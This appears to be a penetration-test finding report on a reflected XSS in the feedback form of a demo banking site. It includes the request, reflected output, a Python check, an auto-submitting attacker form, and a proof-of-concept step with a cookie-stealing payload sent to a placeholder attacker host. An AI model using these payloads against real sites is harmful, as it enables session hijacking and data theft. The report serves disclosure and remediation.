# Reflected XSS in POST /sendFeedback 'name' parameter

**ID:** vuln-0012
**Severity:** MEDIUM
**Found:** 2026-09-20 21:48:29 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /sendFeedback
**Method:** POST
**CWE:** CWE-79
**CVSS:** 6.1
**Confidence:** High
**Fix Effort:** Low

## Description

The `name` field of the feedback form (`POST /sendFeedback`) is echoed unencoded into the confirmation page. Submitting a form with an HTML/JavaScript payload in `name` executes script in the application origin.

## Evidence

Request:
```http
POST /sendFeedback HTTP/1.1
Host: demo.testfire.net
Content-Type: application/x-www-form-urlencoded

name=%3Cimg+src%3Dx+onerror%3Ddocument.title%3D5%3E&email_addr=a%40b.com&subject=s&comments=c&cfile=comments.txt
```
Response excerpt (payload reflected raw):
```html
<p>Thank you for your comments, <img src=x onerror=document.title=5>.  They will be reviewed by our Customer Service staff ...
```
Browser confirmation: after submitting the feedback form from `/feedback.jsp` with the payload in the `name` field, the resulting page's title became `5`, confirming script execution.

## Impact

An attacker can host an auto-submitting page that POSTs the feedback form with a malicious `name` value; when a victim submits it (or is tricked into it), arbitrary JavaScript executes in the app origin in the victim's session, enabling authenticated action riding, cookie/data theft and in-origin phishing. The endpoint has no CSRF protection, so the request can be triggered cross-site.

## Counterevidence

The payload requires a POST, so a plain link is not sufficient — this raises the interaction bar (reflected via a form, not a GET). Checked for a server-side filter or WAF on the field: none — the raw `<img ... onerror=...>` is echoed unchanged. Checked whether the value is written to an attribute or element content: it is element content, and the handler executed in a browser. The confirmation page returns no CSP. Considered whether only the lower-cased `email_addr` is rendered: `name` is rendered verbatim and is the exploitable field.

## What Would Change This Severity

If a CSRF token and strict output encoding were added the finding would be resolved; a demonstrated ability to deliver the POST without any victim interaction would raise severity.

## Technical Analysis

`POST /sendFeedback` renders a confirmation page that includes the submitted `name` and `email_addr` values. The `name` value is inserted into element content without encoding:

```html
<p>Thank you for your comments, <img src=x onerror=document.title=5>.  They will be reviewed by our Customer Service staff ...</p>
```

No output encoding, no CSP and no X-XSS-Protection are present. Because the sink is the POST body, delivery requires the victim to issue the request (e.g. an attacker page that auto-submits a hidden form to `/sendFeedback`). The `email_addr` value is lower-cased on output, but `name` is echoed verbatim.

## Proof of Concept

1. Build an HTML page containing a form that auto-submits to `http://demo.testfire.net/sendFeedback` with `name=<img src=x onerror=document.title=5>`, a valid `email_addr`, `subject`, `comments` and `cfile=comments.txt`.
2. Have the victim open the attacker page (or otherwise POST the form).
3. `/sendFeedback` returns the confirmation page reflecting the payload unencoded; the `onerror` handler fires and `document.title` becomes `5`.
4. To steal data, use `name=<img src=x onerror="new Image().src='//attacker/'+document.cookie">`.

````python
import requests

data = {
    "name": "<img src=x onerror=document.title=5>",
    "email_addr": "a@b.com",
    "subject": "s",
    "comments": "c",
    "cfile": "comments.txt",
}
r = requests.post("http://demo.testfire.net/sendFeedback", data=data, timeout=15)
i = r.text.find("Thank you for your comments")
print(r.text[i:i+120])   # payload reflected unencoded -> executes in browser
```

Attacker HTML (delivery):
```html
<form id="f" action="http://demo.testfire.net/sendFeedback" method="POST">
  <input name="name" value="&lt;img src=x onerror=document.title=5&gt;">
  <input name="email_addr" value="a@b.com">
  <input name="subject" value="s">
  <input name="comments" value="c">
  <input name="cfile" value="comments.txt">
</form>
<script>document.getElementById('f').submit();</script>
````

## Remediation

HTML-encode the `name` (and `email_addr`) values before rendering the confirmation page. Prefer template auto-escaping or a safe DOM text sink. Add a CSRF token to the feedback form and a restrictive `Content-Security-Policy` to limit impact.

## Assumptions

Assumes a victim is induced to submit a crafted feedback form (auto-submitting page or social engineering). No authentication is required to reach `/sendFeedback`.
